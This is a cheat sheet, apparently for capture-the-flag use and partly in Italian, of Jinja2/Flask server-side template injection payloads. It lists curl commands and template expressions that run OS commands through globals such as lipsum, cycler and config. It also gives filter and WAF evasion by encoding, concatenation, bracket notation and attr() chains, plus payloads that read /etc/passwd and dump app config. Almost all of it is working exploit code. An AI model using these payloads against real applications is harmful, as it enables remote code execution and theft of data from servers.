# SSTI Advanced Bypasses - Jinja2/Flask

## Quick Reference: Filter Bypass Techniques

### 1. Request.args Bypass (il filtro non cattura parametri URL)
```bash
curl -X POST 'http://TARGET/?cmd=__import__("os").popen("cat /flag*").read()' \
  --data-urlencode 'content={{request.args.cmd}}'
```

### 2. Lipsum Globals (accesso alternativo a builtins)
```bash
curl -X POST --data-urlencode \
  'content={{lipsum.__globals__.os.popen("cat flag.txt").read()}}' \
  http://TARGET/
```

### 3. Cycler Attr Access
```bash
curl -X POST --data-urlencode \
  'content={{cycler.__init__.__globals__.os.popen("ls").read()}}' \
  http://TARGET/
```

### 4. URL_for Globals
```bash
curl -X POST --data-urlencode \
  'content={{url_for.__globals__["current_app"].config}}' \
  http://TARGET/
```

### 5. Joiner Trick
```bash
curl -X POST --data-urlencode \
  'content={{joiner.__init__.__globals__.os.popen("cat flag.txt").read()}}' \
  http://TARGET/
```

### 6. Namespace Trick
```bash
curl -X POST --data-urlencode \
  'content={{namespace.__init__.__globals__.os.popen("id").read()}}' \
  http://TARGET/
```

## Encoding Bypasses

### Hex Encoding per stringhe bloccate
```python
# 'os' = \x6f\x73
{{lipsum.__globals__["\x6f\x73"].popen("id").read()}}
```

### Unicode Escape
```python
# __class__ = \u005f\u005fclass\u005f\u005f
{{''.__class__}}
```

### Concatenazione per bypassare filtri
```python
# Se 'import' è bloccato
{{request['application']['__globals__']['__builtins__']['__import__']('o'+'s').popen('cat flag.txt').read()}}
```

## Alternative Object Access

### Via config
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Via request
```python
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.__init__.__globals__['os'].popen('id').read()}}
```

### Via g (flask global)
```python
{{g.get.__globals__.__builtins__.open('/etc/passwd').read()}}
```

## Bracket Notation (se i punti sono bloccati)
```python
{{request['application']['__globals__']['__builtins__']['open']('/etc/passwd')['read']()}}
```

## attr() Filter Bypass
```python
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/etc/passwd')|attr('read')()}}
```

## Debugging / Recon Payloads

### Lista globals disponibili
```python
{{config.__class__.__init__.__globals__}}
```

### Lista builtins
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Trova subprocess.Popen
```python
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if 'Popen' in c.__name__ %}
{{c.__name__}}: {{loop.index0}}
{% endif %}
{% endfor %}
```

## Common Flag Locations
```bash
cat flag.txt
cat flag
cat /flag
cat /flag.txt
cat /app/flag.txt
cat /var/www/flag.txt
find / -name "*flag*" 2>/dev/null
env | grep -i flag
```

## Error Messages to Recognize

- `"Stop trying to break me"` → Custom WAF, need creative bypass
- `"Error rendering template"` → Syntax error in payload
- `"UndefinedError"` → Object/method doesn't exist in this context
- `"SecurityError"` → Sandbox active, need escape
- `405 Method Not Allowed` → Try different HTTP method
- `403 Forbidden` → WAF triggered on input
